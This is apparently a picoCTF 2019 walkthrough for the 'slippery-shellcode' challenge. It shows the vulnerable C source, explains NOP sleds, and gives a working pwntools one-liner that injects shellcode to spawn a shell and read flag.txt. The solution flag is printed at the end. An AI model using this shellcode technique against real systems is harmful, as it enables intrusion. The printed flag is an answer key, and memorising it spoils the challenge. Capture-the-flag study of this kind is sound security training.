# slippery-shellcode
200 points

### Description
*"This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0 on the shell server. Source."*

### Solution
If we try to overflow this buffer with any number of characters, it doesn't change the program behavior. However, the program does tell us that after we give it input, it executes from a random location. This still isn't much to go off of, so we'll have to take a step back and look at the source code.
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

`buf` is a 512-byte buffer that is used to get the user's input and print it back out in `vuln`. After `vuln` returns, a randomly chosen instruction will be executed from the first 256-bytes of `buf`. This is random every time, so unless you want to try it around 256 times with the same sized input, you'll want to use **NOP sledding**. 

A **NOP instruction** is simply an instruction that does nothing that affects the program, and so the instruction pointer advances to the next instruction with nothing really happening. A NOP sled is when a chain of NOP instructions is used before the actual payload shellcode to ensure that if the return address is changed to the addresses of *any* of the NOP instructions, then the program will simply keep performin NOP instructions until it hits the shellcode.

There are a few different instructions that technicaly do nothing in the context of the program and so they can be used as NOP instructions, but assembly compilers do provide an actual `nop` instruction. This has a hex value of `\x90`.

We know the program will execute some random insutruction in the first half of `buf`, so we just need to fill the first half of the buffer with NOP instructions, then place our shellcode. Remember, we can use [pwntools](http://docs.pwntools.com/en/latest/) to generate the needed assembly code and assemble it to shellcode. You can also check out [shell-storm](http://shell-storm.org/shellcode/) for lots of different shellcode.
```
$ (python2 -c "from pwn import *; print('\x90'*256 + asm(shellcraft.linux.sh()))"; cat) | ./vuln 
Enter your shellcode:
����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                                                                                                          X
Thanks! Executing from a random location now...
ls
flag.txt  vuln  vuln.c
cat flag.txt
```
**Note**: Don't forget that we use `cat` in our command to keep an open input stream with `vuln` so that we can interact with the shell that we spawn.

And now you have the flag.

<details>
  <summary>Flag:</summary>
  picoCTF{sl1pp3ry_sh311c0d3_0fb0e7da}
</details>

[Next Problem]()

[Return to Binary Exploitation](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%230%20-%20Binary%20Exploitation%20Homepage.md)

[Return to Homepage](https://github.com/sdvickers98/picoCTF-2019-Walkthrough)
